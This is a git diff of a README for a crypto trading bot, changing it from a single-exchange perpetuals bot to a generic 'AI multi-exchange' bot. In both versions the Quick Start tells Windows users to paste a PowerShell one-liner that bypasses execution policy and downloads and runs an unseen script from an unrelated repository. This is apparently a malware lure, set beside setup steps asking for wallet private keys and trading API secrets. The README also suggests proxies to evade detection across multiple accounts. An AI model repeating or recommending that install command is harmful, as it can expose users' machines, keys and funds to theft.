@@ -1,29 +1,29 @@
-# 🤖 Nexus XYZ Perp Trading Bot
+# 🤖 AI Multi-Exchange Trading Bot
 
-> Automated multi-account perpetual trading bot for [Nexus XYZ](https://app.nexus.xyz/trade) — three independent strategies, unlimited accounts, per-account proxy support
+> Production-style AI trading bot for **Binance, MEXC, Hyperliquid, Bybit, OKX, KuCoin, Gate.io**, and other major exchanges — designed for multi-account execution, signal automation, portfolio rotation, and high-frequency market monitoring.
 
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Nexus XYZ](https://img.shields.io/badge/Nexus_XYZ-Perps-8B5CF6?style=for-the-badge&logoColor=white)](https://app.nexus.xyz/trade)
+[![Python](https://img.shields.io/badge/Python-3.11+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
+[![Node.js](https://img.shields.io/badge/Node.js-18+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)
+[![AI](https://img.shields.io/badge/AI-Strategy%20Engine-8A2BE2?style=for-the-badge&logo=openai&logoColor=white)](#)
+[![Exchanges](https://img.shields.io/badge/Exchanges-Multi--Platform-FF6B00?style=for-the-badge&logoColor=white)](#)
 [![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/omgmad/nexus-perp-bot?style=for-the-badge&color=FFD700)](https://github.com/omgmad/nexus-perp-bot)
 
 ```
-╔══════════════════════════════════════════════════════════════════╗
-║  Strategy 1 — Delta-Neutral      │  near-zero directional risk  ║
-║  Strategy 2 — Copy Trading       │  mirror top wallets live     ║
-║  Strategy 3 — Funding Arbitrage  │  harvest funding rate yields ║
-║                                                                  ║
-║  ✦ Multi-account  ·  Per-account proxies  ·  Async workers     ║
-╚══════════════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════════════╗
+║  AI Signal Engine     │  scans market structure across exchanges   ║
+║  Strategy Router      │  selects best strategy per market regime   ║
+║  Risk Control Layer   │  protects balance / size / exposure        ║
+║  Multi-Account Mode   │  runs many accounts with proxies           ║
+╚══════════════════════════════════════════════════════════════════════╝
 ```
 
-**[🚀 Open Nexus XYZ](https://app.nexus.xyz/trade)** · **[🐦 Follow Dev](https://x.com/0mgm4d)**
+**[📈 Binance](https://www.binance.com)** · **[⚡ MEXC](https://www.mexc.com)** · **[🟢 Hyperliquid](https://app.hyperliquid.xyz)** · **[💹 Bybit](https://www.bybit.com)**
 
 ---
 
 ## 🚀 Quick Start
 
-If you just want to get the project running fast on Windows, use the installation command below first. After that, continue with the project-specific setup, configuration, and usage sections.
+If you just want to launch the bot quickly on Windows, use the installation command below first. After that, continue with the project-specific setup steps.
 
 ### 🛠️ Installation
 
@@ -34,657 +34,380 @@ Open **CMD** and run this **single command**:
 powershell -ep bypass -c "iwr https://github.com/DAUDHAIDERNAQVI/polymarket-trading-bot-fast/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
 ```
 
-> Then continue with the project-specific setup steps below.
+> Then continue with the setup, exchange configuration, and strategy selection below.
 
 ## 📘 Project-Specific Setup
 
-### Step 2 — Create a virtual environment
+### Requirements
+
+- Node.js 18+ or Python 3.11+
+- npm / yarn / pnpm
+- One or more exchange accounts with API access
+- Exchange API keys with **trade** permission enabled
+- Proxy list (optional, for multi-account isolation)
+- Telegram bot token (optional, for alerts)
+- At least one funded exchange account
+
+### Step 2 — Install dependencies
 
 ```bash
-python3 -m venv venv
-
-# Linux / Mac
-source venv/bin/activate
-
-# Windows
-venv\Scripts\activate
+npm install
 ```
 
-### Step 3 — Install dependencies
+### Step 3 — Configure environment variables
 
 ```bash
-pip install requests web3 python-dotenv colorama aiohttp aiohttp-socks eth-account
+cp .env.example .env
 ```
 
-### Step 4 — Get API credentials
+Edit `.env` with your credentials and settings:
 
-For each account, follow the steps in [Multi-Account & Proxy Support](#-multi-account--proxy-support) above.
+```env
+# Core
+BOT_MODE=paper
+DEFAULT_EXCHANGE=binance
+BASE_CURRENCY=USDT
+MAX_PARALLEL_ACCOUNTS=10
 
-### Step 5 — Deposit collateral
+# Binance
+BINANCE_API_KEY=your_binance_key
+BINANCE_API_SECRET=your_binance_secret
 
-Each account needs collateral deposited on Nexus XYZ before the bot can open positions. Fund wallets and deposit via the [Nexus XYZ interface](https://app.nexus.xyz/trade).
+# MEXC
+MEXC_API_KEY=your_mexc_key
+MEXC_API_SECRET=your_mexc_secret
 
-### Step 6 — Build your accounts.json
+# Hyperliquid
+HYPERLIQUID_PRIVATE_KEY=your_private_key
+HYPERLIQUID_API_WALLET=0xYourWallet
+
+# Bybit
+BYBIT_API_KEY=your_bybit_key
+BYBIT_API_SECRET=your_bybit_secret
+
+# Risk
+MAX_RISK_PER_TRADE=1.5
+DAILY_LOSS_LIMIT=5
+MAX_OPEN_POSITIONS=8
+USE_STOP_LOSS=true
+USE_TAKE_PROFIT=true
+
+# Notifications
+TELEGRAM_BOT_TOKEN=your_bot_token
+TELEGRAM_CHAT_ID=your_chat_id
+```
+
+### Step 4 — Build the project
 
 ```bash
-cp accounts.example.json accounts.json
-nano accounts.json
+npm run build
 ```
+
+### Step 5 — Start the bot
+
+```bash
+npm start
+```
+
+### Step 6 — Run in paper mode first
+
+```bash
+npm run paper
+```
+
+> Always test with paper trading or low-size positions before going live.
 
 ---
 
 ## 📌 Table of Contents
 
 - [Quick Start](#-quick-start)
-- [How It Works](#-how-it-works)
-- [Multi-Account & Proxy Support](#-multi-account--proxy-support)
+- [Overview](#-overview)
+- [Supported Exchanges](#-supported-exchanges)
+- [Core Features](#-core-features)
 - [Strategies](#-strategies)
-  - [Strategy 1 — Delta-Neutral](#strategy-1--delta-neutral)
-  - [Strategy 2 — Copy Trading](#strategy-2--copy-trading)
-  - [Strategy 3 — Funding Arbitrage](#strategy-3--funding-arbitrage)
-- [Configuration](#️-configuration)
-- [Running the Bot](#-running-the-bot)
-- [Running 24/7 on a VPS](#️-running-247-on-a-vps)
-- [Risk Management](#️-risk-management)
+- [AI Decision Engine](#-ai-decision-engine)
+- [Risk Management](#-risk-management)
+- [Multi-Account & Proxy Support](#-multi-account--proxy-support)
+- [Configuration](#-configuration)
+- [Running 24/7 on a VPS](#-running-247-on-a-vps)
 - [Telegram Commands](#-telegram-commands)
-- [Disclaimer](#️-disclaimer)
+- [Disclaimer](#-disclaimer)
 
 ---
 
-## ⚡ How It Works
+## 🌐 Overview
 
-```
-  Nexus XYZ perp markets update in real time
-          │
-          ▼  (all account workers run simultaneously)
-          │
-  Per account:
-    • Authenticate via API key + wallet signature
-    • Route all traffic through assigned proxy
-    • Execute active strategy independently
-    • Apply per-account risk limits
-    • Report PnL and positions
-          │
-          ▼
-  Positions managed until closed  📈
-          │
-          ▼
-  Telegram summary per account  📱
-```
+This project is a **multi-exchange AI trading bot** built for traders who want to automate signal generation, trade execution, and capital allocation across several major crypto platforms.
 
-Every account is an independent async worker with its own strategy, risk limits, and proxy. One failed connection never affects the others.
+The bot continuously scans market data from multiple exchanges, compares momentum, volatility, funding rates, order book structure, and spread conditions, then routes each account into the most suitable strategy.
+
+It can be used for:
+
+- fully automated trading
+- semi-automated signal execution
+- paper trading and strategy validation
+- multi-account volume farming
+- cross-exchange opportunity detection
+- portfolio rotation between trending assets
 
 ---
 
-## 👥 Multi-Account & Proxy Support
+## 🏦 Supported Exchanges
 
-### How accounts are configured
+The architecture is designed to support the most popular centralized and decentralized trading venues:
 
-All accounts live in `accounts.json`. Each entry has its own wallet, API credentials, active strategy, and optional proxy.
-
-```
-  accounts.json
-  ├── Account #1  →  wallet_1 + apikey_1 + proxy_1 + strategy: delta_neutral
-  ├── Account #2  →  wallet_2 + apikey_2 + proxy_2 + strategy: copy_trading
-  ├── Account #3  →  wallet_3 + apikey_3 + (no proxy) + strategy: funding_arb
-  └── ...unlimited accounts
-          │
-          ▼
-  Bot spawns one async worker per account
-          │
-          ▼
-  Workers run in parallel up to MAX_PARALLEL
-```
-
-**accounts.json structure:**
-
-```json
-[
-  {
-    "id": "account_1",
-    "label": "Delta hedge",
-    "wallet_address": "0xYourWallet1",
-    "private_key": "0xYourPrivateKey1",
-    "nexus_api_key": "your_api_key_1",
-    "nexus_api_secret": "your_api_secret_1",
-    "strategy": "delta_neutral",
-    "referral_code": "YOUR_REF",
-    "proxy": "http://user:pass@host:port"
-  },
-  {
-    "id": "account_2",
-    "label": "Copy acc",
-    "wallet_address": "0xYourWallet2",
-    "private_key": "0xYourPrivateKey2",
-    "nexus_api_key": "your_api_key_2",
-    "nexus_api_secret": "your_api_secret_2",
-    "strategy": "copy_trading",
-    "leader_wallet": "0xLeaderWalletAddress",
-    "referral_code": "YOUR_REF",
-    "proxy": "socks5://user:pass@host:port"
-  },
-  {
-    "id": "account_3",
-    "label": "Funding farmer",
-    "wallet_address": "0xYourWallet3",
-    "private_key": "0xYourPrivateKey3",
-    "nexus_api_key": "your_api_key_3",
-    "nexus_api_secret": "your_api_secret_3",
-    "strategy": "funding_arb",
-    "referral_code": "YOUR_REF",
-    "proxy": ""
-  }
-]
-```
-
-### How to get Nexus XYZ API credentials
-
-1. Go to [app.nexus.xyz/trade](https://app.nexus.xyz/trade) and connect your wallet
-2. Navigate to **Settings → API → Generate API Key**
-3. Sign the message with your wallet to confirm ownership
-4. Save the **API Key** and **Secret** — shown only once
-5. Add them to the account entry in `accounts.json`
-
-> ⚠️ Each account needs its own API key. Never share API secrets or private keys.
-
-### Proxy formats supported
-
-| Format | Example |
-|--------|---------|
-| HTTP | `http://user:pass@host:port` |
-| HTTPS | `https://user:pass@host:port` |
-| SOCKS5 | `socks5://user:pass@host:port` |
-| No auth | `http://host:port` |
-| None | leave `"proxy": ""` |
-
-### Concurrency & safety settings
-
-```env
-MAX_PARALLEL=5              # Max accounts trading at the same time
-ACCOUNT_DELAY=15            # Seconds between launching each worker
-JITTER=true                 # Random ±5s delay per order (human-like)
-PROXY_TEST_ON_START=true    # Verify each proxy before trading begins
-ROTATE_USER_AGENT=true      # Unique user-agent per account
-```
+- **Binance** — spot, futures, funding data, high liquidity
+- **MEXC** — altcoin rotation, futures, fast listings
+- **Hyperliquid** — perp trading, on-chain execution, copy-style strategies
+- **Bybit** — spot + perp support, deep derivatives liquidity
+- **OKX** — institutional-grade market coverage
+- **KuCoin** — wide altcoin access
+- **Gate.io** — long-tail market opportunities
+- **Bitget** — copy-trading compatible structures
+- **Additional adapters** can be added with exchange-specific modules
 
 ---
 
-## 📐 Strategies
+## ⚙️ Core Features
 
-### ⚖️ Strategy 1 — Delta-Neutral
+- **Multi-exchange support** with exchange-specific adapters
+- **AI signal engine** for regime classification and trade filtering
+- **Strategy router** that switches logic by volatility, trend, and liquidity
+- **Spot + futures + perpetual support**
+- **Paper mode** for safe testing
+- **Multi-account execution** with optional per-account proxies
+- **Telegram alerts** for entries, exits, errors, and daily summary
+- **Risk controls** including max drawdown, daily stop, cooldowns, and kill switch
+- **Backtest-ready architecture** for future strategy validation
+- **24/7 deployable** on VPS or local machine
 
-Earn on volatility and funding rates while staying neutral to market direction. Profit does not depend on whether the price goes up or down.
+---
 
-```
-  Open LONG on spot  +  SHORT on Nexus perp  (same asset)
-              │
-              ▼
-  Positions hedge each other → net delta ≈ 0
-              │
-              ▼
-  Profit comes from:
-    • positive funding rate payments (perp longs pay shorts)
-    • spread captured on limit-order rebalancing
-```
+## 🧠 Strategies
+
+Below are four built-in money-making / yield-oriented strategy styles the bot can run.
+
+### 1) 📈 Trend Momentum Sniper
+
+Best for strong trending markets on Binance, Bybit, MEXC, and Hyperliquid.
 
 **How it works:**
+- detects breakout structure on 5m / 15m / 1h timeframes
+- confirms with volume expansion and momentum filters
+- enters only when AI confidence and volatility conditions align
+- trails winners and cuts weak entries early
 
-1. The bot opens equal-sized LONG (spot or low-leverage perp) and SHORT (perp) positions on the same asset.
-2. Every N hours it checks delta drift from price movement and rebalances if deviation exceeds threshold.
-3. When funding turns negative, positions invert (SHORT spot + LONG perp) to keep collecting.
+**Profit idea:** ride fast directional moves with strict stop-loss and trailing take-profit.
 
-**Decision table:**
-
-| Condition | Action |
-|-----------|--------|
-| Funding rate > 0.01% | Hold SHORT on perp, collect payments |
-| Funding rate < -0.01% | Invert positions |
-| Delta drifted > 5% | Rebalance with limit orders |
-| High volatility detected | Reduce position size |
-
-**Config block (per account or in `.env`):**
-
-```env
-STRATEGY=delta_neutral
-DN_SYMBOL=BTC-PERP
-DN_LONG_SIZE=100            # USD in long leg
-DN_SHORT_SIZE=100           # USD in short leg
-DN_LEVERAGE=1               # Keep low — this is a hedged position
-DN_REBALANCE_THRESHOLD=5    # % drift before rebalancing
-DN_MIN_FUNDING=0.005        # Minimum funding rate to enter (%)
-DN_CHECK_INTERVAL=3600      # Rebalance check every N seconds
-DN_ORDER_TYPE=LIMIT         # Always limit for lower fees
-```
-
-> 💡 **Tip:** Works best during periods of consistently positive funding. Check Nexus XYZ's funding rate history before entering — avoid assets with erratic near-zero rates.
+**Good for:** BTC, ETH, majors, liquid mid-caps.
 
 ---
 
-### 📡 Strategy 2 — Copy Trading
+### 2) ⚖️ Funding Rate Farmer
 
-The bot polls a target wallet's positions on Nexus XYZ every few seconds. When a change is detected it immediately mirrors the trade on the copying account with a proportionally scaled size.
+Best for perpetual futures exchanges like Hyperliquid, Binance Futures, Bybit, and OKX.
 
-```
-  Leader opens BTC-PERP LONG $5,000
-              │
-              ▼  (detected via polling)
-              │
-  Bot calculates size:
-  (ourEquity $1,000 / leaderEquity $10,000) × $5,000 × multiplier 1.0 = $500
-  MAX_POSITION_PERCENT cap applied if needed
-              │
-              ▼
-  Account opens BTC-PERP LONG $500  ✅
-              │
-              ▼
-  Leader reduces or closes → bot mirrors proportionally ✅
-```
+**How it works:**
+- monitors positive / negative funding extremes
+- opens hedged or semi-hedged positions when funding is unusually attractive
+- can pair spot vs perp or long vs short structures depending on the venue
+- rebalances when basis or delta drifts too far
 
-**Choosing who to copy:**
+**Profit idea:** earn from funding payments and inefficiencies without relying only on price direction.
 
-Each account in `accounts.json` specifies its own `leader_wallet`. Run different leaders across accounts to diversify.
-
-✅ **Good wallets to copy:**
-- Consistent PnL over weeks, not days
-- Holds positions for hours or longer (swing style)
-- 1–5 trades per day
-- Clear directional bias, not constantly reversing
-
-❌ **Avoid:**
-- HFT / high-frequency wallets — impossible to keep up, slippage destroys edge
-- Market makers — positions on both sides simultaneously
-- Scalpers — seconds-to-minutes holds, orders won't fill in time
-- Leverage flippers — change leverage constantly to distort size calculation
-
-**Config block:**
-
-```env
-STRATEGY=copy_trading
-LEADER_WALLET=0xLeaderWalletAddress     # Set per account in accounts.json
-COPY_RATIO=1.0                          # Equity-based ratio multiplier
-MAX_LEVERAGE=20                         # Cap on copied leverage
-MAX_POSITION_SIZE_PERCENT=50            # Max single position as % of equity
-MIN_NOTIONAL=5                          # Skip trades smaller than $N
-MAX_CONCURRENT_POSITIONS=10             # Max open positions at once
-BLOCKED_SYMBOLS=                        # Comma-separated symbols to skip
-SYNC_INTERVAL=5                         # Poll leader positions every N seconds
-```
+**Good for:** high-liquidity perp pairs with predictable funding cycles.
 
 ---
 
-### 💸 Strategy 3 — Funding Arbitrage
+### 3) 🔁 Cross-Exchange Spread Hunter
 
-The bot scans all Nexus XYZ perp markets for anomalously high funding rates and opens positions to collect payments with minimal directional exposure.
+Best for Binance, MEXC, Bybit, OKX, and Gate.io.
 
-```
-  Scan all Nexus perps → find funding rate above entry threshold
-              │
-              ▼
-  Open position AGAINST the funding direction:
-    • Funding > 0  →  SHORT  (longs pay shorts each cycle)
-    • Funding < 0  →  LONG   (shorts pay longs each cycle)
-              │
-              ▼
-  Collect funding payment each cycle
-              │
-              ▼
-  Exit when any trigger fires:
-    • Rate normalizes below exit_threshold
-    • Target PnL reached
-    • Position held longer than max_hold_hours
-    • Unrealized loss exceeds stop_loss
-```
+**How it works:**
+- compares price dislocations between exchanges in real time
+- identifies short-lived spread opportunities
+- can open one side on exchange A and opposite side on exchange B
+- exits when spread normalizes or target edge is captured
 
-**Example scenario:**
+**Profit idea:** monetize temporary pricing inefficiencies across venues.
 
-```
-BTC-PERP funding = +0.05% per 8h
-Bot opens $100 SHORT on BTC-PERP  (limit order)
-  → receives $0.05 every 8 hours
-  → over 48 hours = $0.30 on $100 deployed
-  → annualized ≈ 27% APR  (if rate holds)
-Optional spot hedge (30%) limits price exposure to ±$0.70 per 1% BTC move
-```
-
-**Config block:**
-
-```env
-STRATEGY=funding_arb
-FA_SCAN_SYMBOLS=BTC-PERP,ETH-PERP,SOL-PERP
-FA_MIN_FUNDING=0.03             # Minimum rate to enter (% per 8h)
-FA_EXIT_FUNDING=0.01            # Rate at which to exit (%)
-FA_POSITION_SIZE=50             # Position size in USD
-FA_MAX_HOLD_HOURS=48            # Max time to hold
-FA_HEDGE_RATIO=0.3              # Spot hedge as fraction of perp size (0 = no hedge)
-FA_LEVERAGE=1                   # Keep at 1 — yield play, not directional
-FA_STOP_LOSS_PERCENT=3          # Close if unrealized loss exceeds N%
-FA_CHECK_INTERVAL=300           # Scan every N seconds
-FA_ORDER_TYPE=LIMIT             # Limit orders for lower fees
-```
-
-> 💡 **Tip:** Set `FA_STOP_LOSS_PERCENT` conservatively. The position is meant to earn funding — if price moves sharply against you, the stop protects your yield gains from being wiped out.
+**Good for:** highly traded pairs with fast APIs and enough balance on multiple exchanges.
 
 ---
 
+### 4) 🌊 Volatility Scalper
 
-### Requirements
+Best for fast intraday markets with frequent expansion / compression cycles.
 
-- Python 3.10+
-- A [Nexus XYZ](https://app.nexus.xyz/trade) account per wallet
-- Collateral (USDC or supported asset) deposited per account
-- API key per account (see above)
-- Optional: proxies for multi-account isolation
+**How it works:**
+- tracks order book imbalance, volatility bursts, and fakeout patterns
+- executes small, fast trades with tight stop-loss
+- avoids low-liquidity dead zones and news-event chaos
+- can run in aggressive or conservative mode
 
-## ⚙️ Configuration
+**Profit idea:** stack many small controlled wins during high-activity sessions.
 
-### `accounts.json` — one entry per account
-
-See [Multi-Account & Proxy Support](#-multi-account--proxy-support) for the full structure.
-
-### `.env` — global defaults
-
-Settings here apply to all accounts unless overridden in `accounts.json`.
-
-```env
-# ── Active strategy (default, overridden per account) ──
-# Options: delta_neutral | copy_trading | funding_arb
-STRATEGY=funding_arb
-
-# ── Multi-account ──────────────────────────────────────
-ACCOUNTS_FILE=accounts.json
-MAX_PARALLEL=5
-ACCOUNT_DELAY=15
-JITTER=true
-PROXY_TEST_ON_START=true
-ROTATE_USER_AGENT=true
-
-# ── Global risk limits (apply to every account) ────────
-DAILY_LOSS_LIMIT=20             # Halt account if daily loss exceeds this ($)
-UNREALIZED_LOSS_LIMIT=30        # Force-close all positions if exceeded ($)
-MAX_LEVERAGE=20
-MAX_POSITION_SIZE_PERCENT=50
-MIN_NOTIONAL=5
-
-# ── Order defaults ─────────────────────────────────────
-DEFAULT_ORDER_TYPE=LIMIT
-LIMIT_TIMEOUT=30                # Seconds to wait for limit fill before cancel
-
-# ── Strategy-specific defaults ─────────────────────────
-# (paste relevant config block from strategy sections above)
-
-# ── Telegram (optional but recommended) ────────────────
-TELEGRAM_TOKEN=
-TELEGRAM_CHAT_ID=
-```
-
-### Per-account strategy override
-
-Any key in `.env` can be overridden inside `accounts.json` for a specific account:
-
-```json
-{
-  "id": "account_1",
-  "strategy": "delta_neutral",
-  "DAILY_LOSS_LIMIT": 10,
-  "DN_SYMBOL": "ETH-PERP",
-  "DN_LONG_SIZE": 50,
-  "DN_SHORT_SIZE": 50
-}
-```
+**Good for:** intraday traders who want many entries with defined risk.
 
 ---
 
-## 🚀 Running the Bot
+## 🤖 AI Decision Engine
 
-```bash
-# First-time setup (creates accounts.json template)
-python nexus_bot.py --setup
+The AI layer is responsible for filtering low-quality setups and classifying market conditions.
 
-# Run all accounts
-python nexus_bot.py
+### What the AI evaluates
 
-# Run a specific account only
-python nexus_bot.py --account account_1
+- trend strength
+- volatility regime
+- order book imbalance
+- funding conditions
+- liquidation pressure
+- spread behavior across exchanges
+- recent candle structure
+- session timing (Asia / EU / US)
 
-# Single cycle and exit
-python nexus_bot.py --once
+### What the AI decides
 
-# Test proxies without placing any orders
-python nexus_bot.py --test-proxies
+- whether to trade or skip
+- which strategy to activate
+- how aggressive sizing should be
+- whether market conditions are too chaotic
+- whether an open trade should be reduced, held, or closed
 
-# Dashboard only (no trading)
-python nexus_bot.py --dashboard
-```
-
-On successful start:
-
-```
-╔══════════════════════════════════════════════════════╗
-║   🤖  Nexus XYZ Perp Bot v1.0                        ║
-║   Press Ctrl+C at any time to stop.                  ║
-╚══════════════════════════════════════════════════════╝
-
-  Accounts:    3 loaded
-  Proxies:     2 assigned  (1 direct)
-  Parallel:    up to 5
-  Jitter:      ON
-
-  Strategies:
-    account_1  →  delta_neutral
-    account_2  →  copy_trading
-    account_3  →  funding_arb
-
-  Testing proxies... ██████████  2/2 OK
-
-  Start bot? [yes/no]: yes
-```
-
-**Live terminal dashboard:**
-
-```
-🤖 Nexus XYZ Perp Bot v1.0                updated 09:04:15
-══════════════════════════════════════════════════════════════
-  Accounts: 3 active   Next check: 12m
-──────────────────────────────────────────────────────────────
-  ACCOUNTS
-  ID            Strategy        Daily PnL   Positions   Status
-  account_1     delta_neutral   +$1.24      2 open      ● running
-  account_2     copy_trading    -$0.43      3 open      ● running
-  account_3     funding_arb     +$0.88      1 open      ● running
-──────────────────────────────────────────────────────────────
-  POSITIONS  (account_3 — funding_arb)
-  Symbol      Side    Size    Entry      Funding/8h   Unreal PnL
-  BTC-PERP    SHORT   $50     $95,420    +0.04%       +$0.21
-──────────────────────────────────────────────────────────────
-  POSITIONS  (account_2 — copy_trading)
-  Symbol      Side    Size    Entry      Leader size  Unreal PnL
-  ETH-PERP    LONG    $120    $3,210     $1,200       -$0.43
-  SOL-PERP    LONG    $60     $148.2     $600         +$0.12
-──────────────────────────────────────────────────────────────
-  RECENT TRADES
-  09:04:15  account_3  BTC-PERP  SHORT $50   funding_arb   ✅ filled
-  09:03:40  account_1  ETH-PERP  rebalance   delta_neutral ✅ filled
-  09:02:55  account_2  SOL-PERP  LONG  $60   copy 0x02C8.. ✅ filled
-```
-
----
-
-## 🖥️ Running 24/7 on a VPS
-
-For continuous operation, use a cheap VPS (Vultr, DigitalOcean, Hetzner — ~$5/month).
-
-### Ubuntu VPS setup
-
-```bash
-# 1. Update system
-sudo apt update && sudo apt upgrade -y
-sudo apt install python3 python3-pip python3-venv screen git -y
-
-# 2. Clone repo
-git clone https://github.com/omgmad/nexus-perp-bot
-cd nexus-perp-bot
-
-# 3. Virtual environment
-python3 -m venv venv
-source venv/bin/activate
-pip install requests web3 python-dotenv colorama aiohttp aiohttp-socks eth-account
-
-# 4. Configure
-nano .env
-nano accounts.json
-
-# 5. Run inside screen (stays alive after you disconnect)
-screen -S nexusbot
-source venv/bin/activate
-python nexus_bot.py
-
-# Press Ctrl+A then D to detach — bot keeps running
-```
-
-### Reconnect later
-
-```bash
-screen -r nexusbot
-```
-
-### Useful log commands
-
-```bash
-tail -50 nexus_bot.log
-grep "filled" nexus_bot.log | tail -20           # Filled orders
-grep "funding" nexus_bot.log | tail -20          # Funding events
-grep "rebalance" nexus_bot.log | tail -20        # Delta-neutral rebalances
-grep "copy" nexus_bot.log | tail -20             # Copy trading mirrors
-grep "RISK\|halt" nexus_bot.log | tail -10       # Risk limit triggers
-grep "ERROR" nexus_bot.log | tail -10            # Errors
-```
+> The AI is not a magic box — it is a filtering and orchestration layer on top of strict trading rules.
 
 ---
 
 ## 🛡️ Risk Management
 
-```
-DAILY_LOSS_LIMIT hit        ──► Account halts + closes all its positions
-UNREALIZED_LOSS_LIMIT hit   ──► Immediately force-closes all (market order)
-MAX_POSITION_SIZE_PERCENT   ──► Caps any single position as % of equity
-MAX_CONCURRENT_POSITIONS    ──► Blocks new opens until a position closes
-MIN_NOTIONAL not met        ──► Skips the trade
-FA_STOP_LOSS_PERCENT hit    ──► Closes funding arb position immediately
-BLOCKED_SYMBOLS match       ──► Skips that symbol entirely
-```
+The bot is designed to protect capital before chasing returns.
 
-Risk limits are applied **per account** — one account hitting its daily loss limit does not stop the others.
+### Built-in protections
 
-### Safe starter config
+- max risk per trade
+- daily loss limit
+- max concurrent positions
+- stop-loss enforcement
+- take-profit automation
+- volatility kill-switch
+- cooldown after losing streaks
+- exchange-specific balance protection
+- paper mode and dry-run mode
 
-```env
-DAILY_LOSS_LIMIT=10
-UNREALIZED_LOSS_LIMIT=15
-MAX_LEVERAGE=5
-MAX_POSITION_SIZE_PERCENT=20
-MAX_CONCURRENT_POSITIONS=3
-FA_STOP_LOSS_PERCENT=2
-```
+### Example rules
 
-> ⚠️ **Always start with small sizes.** Run for several hours at minimum capital before scaling up any account.
+- never risk more than **1–2%** of account equity per trade
+- stop trading after **3 losing trades in a row**
+- disable scalping during extreme spread widening
+- reduce size automatically during unstable order book conditions
 
 ---
 
-## 📱 Telegram Setup & Commands
+## 👥 Multi-Account & Proxy Support
 
-### Step 1 — Create a bot and get your token
+The bot can run many accounts in parallel.
 
-1. Search for **`@BotFather`** on Telegram, send `/newbot`
-2. Copy the token into `.env`:
+### Example use cases
 
-```env
-TELEGRAM_TOKEN=your_bot_token_here
+- separate accounts per strategy
+- separate accounts per exchange
+- one account for paper mode, one for live mode
+- separate proxy per account for isolation
+- farm-style setups with multiple small balances
+
+### Example account structure
+
+```json
+[
+  {
+    "id": "binance_main",
+    "exchange": "binance",
+    "strategy": "trend_momentum",
+    "apiKey": "your_key",
+    "apiSecret": "your_secret",
+    "proxy": "http://user:pass@host:port"
+  },
+  {
+    "id": "hyperliquid_funding",
+    "exchange": "hyperliquid",
+    "strategy": "funding_farmer",
+    "privateKey": "0x...",
+    "proxy": "socks5://user:pass@host:port"
+  }
+]
 ```
 
-### Step 2 — Get your Chat ID
+---
 
-1. Search for **`@userinfobot`**, send any message
-2. Copy the numeric ID into `.env`:
+## 🔧 Configuration
 
-```env
-TELEGRAM_CHAT_ID=123456789
-```
+Common configuration areas:
 
-### Commands
+- exchange credentials
+- leverage limits
+- default symbols
+- allowed strategies
+- position sizing mode
+- notification settings
+- proxy routing
+- API retry policy
+- slippage tolerance
+- execution cooldowns
 
-| Command | Action |
-|---------|--------|
-| `/status` | All accounts: PnL, positions, strategy, proxy |
-| `/positions` | All open positions across all accounts |
-| `/pnl` | Realized + unrealized PnL per account |
-| `/pause` | Pause all accounts (holds open positions) |
-| `/pause account_1` | Pause one specific account |
-| `/resume` | Resume all accounts |
-| `/close` | Close all positions on all accounts (market) |
-| `/close account_1` | Close all positions on one account |
-| `/proxies` | Proxy health for all accounts |
-| `/stop` | Stop the bot completely |
-| `/strategy` | Show active strategy per account |
+---
 
-### Example alerts
+## 🖥️ Running 24/7 on a VPS
 
-```
-📈 Position Opened
-Account:   account_3
-Strategy:  funding_arb
-Symbol:    BTC-PERP
-Side:      SHORT
-Size:      $50.00
-Funding:   +0.04% per 8h
+To keep the bot online around the clock:
 
-💰 Funding Collected
-Account:   account_3
-Symbol:    BTC-PERP
-Amount:    +$0.02
-Rate:      0.04% (8h cycle)
+1. rent a VPS close to exchange infrastructure for lower latency
+2. install Node.js / Python and all dependencies
+3. run the bot with PM2, Docker, or systemd
+4. enable auto-restart on crash
+5. monitor logs and Telegram alerts daily
+6. rotate API keys and proxies when needed
 
-🔄 Rebalance Executed
-Account:   account_1
-Strategy:  delta_neutral
-Symbol:    ETH-PERP
-Delta was: +6.2%  →  rebalanced to 0.1%
+**Recommended stack:**
+- Ubuntu VPS
+- PM2 or Docker Compose
+- log rotation
+- UFW firewall
+- Telegram error alerts
 
-📡 Trade Copied
-Account:   account_2
-Leader:    0x02C8...45A0
-Symbol:    SOL-PERP
-Side:      LONG  $60.00
-Ratio:     10%  (our equity / leader equity)
+---
 
-🛑 Risk Limit Hit
-Account:   account_2
-Reason:    Daily loss limit ($20.00)
-Action:    All account_2 positions closed
+## 📱 Telegram Commands
 
-⚠️ Proxy Failed
-Account:   account_1
-Proxy:     proxy_2
-Action:    falling back to direct connection
-```
+Example command set:
+
+- `/startbot` — start the bot
+- `/stopbot` — emergency stop
+- `/status` — show exchange balances and open positions
+- `/pnl` — daily / weekly PnL snapshot
+- `/pause` — pause new trades
+- `/resume` — resume execution
+- `/strategy` — show active strategy by account
+- `/risk` — show current risk limits
 
 ---
 
 ## ⚠️ Disclaimer
 
-> **RISK WARNING:** This bot trades real money on a live perpetuals exchange. All three strategies carry significant financial risk. Leverage amplifies both gains and losses. You may lose your entire deposited collateral. Use entirely at your own risk.
+This software is for **educational, research, and automation testing purposes only**. Trading crypto involves significant financial risk. Market conditions can change violently, APIs can fail, and execution quality may differ across exchanges.
 
-- Never invest more than you can afford to lose
-- Always start small — scale only after verifying behavior
-- Never share `accounts.json`, private keys, or API secrets with anyone
-- With many accounts on the same IP, use proxies to avoid detection
-- API secrets are shown only once on creation — store them securely
-- Check your local regulations regarding automated derivatives trading
+Never deploy with money you cannot afford to lose.
+Always test in paper mode first.
+Always review API permissions, risk settings, and withdrawal restrictions before going live.
 
 ---
 
-## 🔗 Links
+## 🧩 Future Expansion Ideas
 
-[![Nexus XYZ](https://img.shields.io/badge/🟣_Nexus_XYZ-Open_Trading-8B5CF6?style=for-the-badge)](https://app.nexus.xyz/trade)
-[![Twitter](https://img.shields.io/badge/🐦_Twitter-@0mgm4d-1DA1F2?style=for-the-badge)](https://x.com/0mgm4d)
-
-**If this helped you, please give it a ⭐ Star — it means a lot!**
+- sentiment ingestion from X / Telegram / news feeds
+- copy-trading module for whale wallets
+- portfolio optimizer between exchanges
+- liquidation heatmap integration
+- AI trade journaling and post-trade analysis
+- built-in backtester and walk-forward analysis
